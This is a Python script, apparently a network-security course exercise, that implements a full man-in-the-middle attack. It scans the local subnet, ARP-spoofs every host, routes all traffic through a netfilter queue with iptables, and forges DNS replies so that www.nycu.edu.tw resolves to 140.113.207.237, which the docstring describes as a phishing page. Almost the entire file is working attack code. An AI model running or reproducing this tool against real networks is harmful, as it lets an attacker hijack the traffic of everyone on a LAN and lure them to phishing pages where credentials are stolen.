#!/usr/bin/env python3

import mitm_attack as mitm
from mitm_attack import cmd
from scapy.all import *
from netfilterqueue import NetfilterQueue

QUEUENUM = 0
TARGET_DOMAIN_NAME = b'www.nycu.edu.tw.'
ATTACKER_SERVER = '140.113.207.237'
# collect basic information
HOST_IP = get_if_addr(conf.iface)  # default interface
HOST_MAC = get_if_hwaddr(conf.iface) # default interface
GW_IP = conf.route.route("0.0.0.0")[2] # gateway
SUBNET = GW_IP + '/24'

def dns_spoof_reply(packet):
    """Spoof DNS response packet"""
    # update DNS layer
    packet[DNS].an = DNSRR(rrname=packet[DNSQR].qname, rdata=ATTACKER_SERVER)
    packet[DNS].ancount = 1
    # delete checksum and  length (since modified), scapy will recalculate them
    if packet.haslayer(IP):
        del packet[IP].len
        del packet[IP].chksum
    if packet.haslayer(UDP):
        del packet[UDP].len
        del packet[UDP].chksum

    return packet

def queue_callback(pkt):
    """Netfilter queue callback function

    The function is called when a new packet is redirected to the netfilter queue.
    Modify DNS reply packets with qname www.nycu.edu.tw.

    :param pkt: netfilter queue packet
    """
    # convert netfilter queue packet into scapy packet
    packet = IP(pkt.get_payload())
    #print('packet in:', packet.summary())
    # check layers
    #if packet.haslayer(UDP) and packet.haslayer(DNS) and packet.haslayer(DNSRR):
    if packet.haslayer(DNSRR):
        if TARGET_DOMAIN_NAME in packet[DNSQR].qname:
            print("[*] Redirecting NYCU to 140.113.207.237")
            # print original packet
            print('original:', packet.summary())
            # spoof dns reply packet
            packet = dns_spoof_reply(packet)
            print('modified:', packet.summary())
    
    # convert back to netfilter queue packet and accept it
    pkt.set_payload(bytes(packet))
    pkt.accept()
        
def dns_spoofing():
    """DNS spoofing

    Whenever a packet is forwarded, redirect it to the netfilter queue number 0.
    Redirect NYCU home page (www.nycu.edu.tw) to phishing page (140.113.207.237).
    """
    # set iptable rule on forwarding
    cmd('sysctl -w net.ipv4.ip_forward=1')
    cmd(f'iptables -I OUTPUT -j NFQUEUE --queue-num {QUEUENUM}')
    cmd(f'iptables -I INPUT -j NFQUEUE --queue-num {QUEUENUM}')
    cmd(f'iptables -I FORWARD -j NFQUEUE --queue-num {QUEUENUM}')

    # filtering and redirecting packets
    queue = NetfilterQueue()
    try:
        print('[+] Start DNS spoofing')
        print('[*] To stop DNS spoofing, press ctrl+c')
        # bind the queue number (0) to the callback function and start it
        queue.bind(QUEUENUM, queue_callback)
        queue.run()
    except KeyboardInterrupt:
        # remove the rules
        cmd("iptables --flush")
        print('[+] Stop DNS spoofing')
        return

def main():
    """Main program

    1. Scan available devices IPs and MACs
    2. ARP spoofing
    3. DNS spoofing
    """
    print('[+] Basic information')
    print(f'Host\t{HOST_IP}\t{HOST_MAC}')
    print(f'Gateway\t{GW_IP}')
    print(f'Subnet\t{SUBNET}')

    # get available devices information
    ip_mac_dict = mitm.scan_ip_mac(GW_IP, SUBNET)
    # Send spoofed ARP packets to all devices first (to become a middle man)
    mitm.arp_spoofing(ip_mac_dict, HOST_MAC, GW_IP)
    # task 4
    dns_spoofing()

if __name__ == '__main__':
    main()